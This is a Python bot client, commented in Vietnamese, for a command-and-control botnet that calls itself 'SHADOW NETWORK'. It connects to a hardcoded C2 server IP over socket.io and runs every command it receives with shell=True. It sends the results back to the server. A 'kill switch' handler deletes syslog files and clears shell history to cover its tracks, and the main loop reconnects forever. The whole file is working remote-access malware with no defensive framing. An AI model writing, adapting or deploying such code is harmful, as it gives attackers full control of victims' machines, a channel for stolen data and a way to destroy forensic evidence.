import socketio
import subprocess
import time
import os

sio = socketio.Client()

# IP VPS của bạn
C2_SERVER_URL = 'http://172.93.163.140:3000 '

@sio.event
def connect():
    print("[+] Đã xâm nhập thành công vào mạng lưới SHADOW NETWORK!")

# --- 1. SỰ KIỆN NHẬN LỆNH TỪ PANEL ---
@sio.on('executeCommand')
def on_message(command):
    print(f"[*] Nhận lệnh từ Trạm Chỉ Huy: {command}")
    
    # Báo cáo lên Terminal ngay khi nhận lệnh
    sio.emit('botResponse', f"Đã nhận lệnh: {command}")
    
    try:
        # Chạy lệnh thẳng vào hệ thống
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        # Bắn kết quả về Terminal (Giới hạn 500 ký tự tránh spam)
        sio.emit('botResponse', f"Thành công:\n{result[:500]}") 
    except subprocess.CalledProcessError as e:
        # Bắn lỗi về Terminal
        sio.emit('botResponse', f"Lỗi thực thi:\n{e.output[:500]}")

# --- 2. SỰ KIỆN NHẬN LỆNH TỰ HỦY (KILL SWITCH) ---
@sio.on('emergencyDestroy')
def kill_switch():
    print("[!!!] TÍN HIỆU TỰ HỦY ĐƯỢC KÍCH HOẠT TỪ SERVER!")
    sio.emit('botResponse', "Đang dọn dẹp hệ thống và tự ngắt kết nối...")
    
    # Thực hiện lệnh dọn dẹp (Nếu bot chạy trên Linux/Ubuntu)
    try:
        # Ví dụ: Xóa log syslog và history
        subprocess.run("rm -rf /var/log/syslog* && history -c", shell=True)
    except:
        pass
        
    sio.disconnect() # Cắt đứt mạng
    os._exit(0)      # Thoát và kill luôn file Python đang chạy này

if __name__ == '__main__':
    while True:
        try:
            # Thêm ?type=bot để Server nhận diện và cộng số thiết bị
            sio.connect(f"{C2_SERVER_URL}?type=bot")
            sio.wait()
        except Exception as e:
            print(f"[-] Rớt mạng, đang thử dò tìm lại Trạm Chỉ Huy...")
            time.sleep(5)
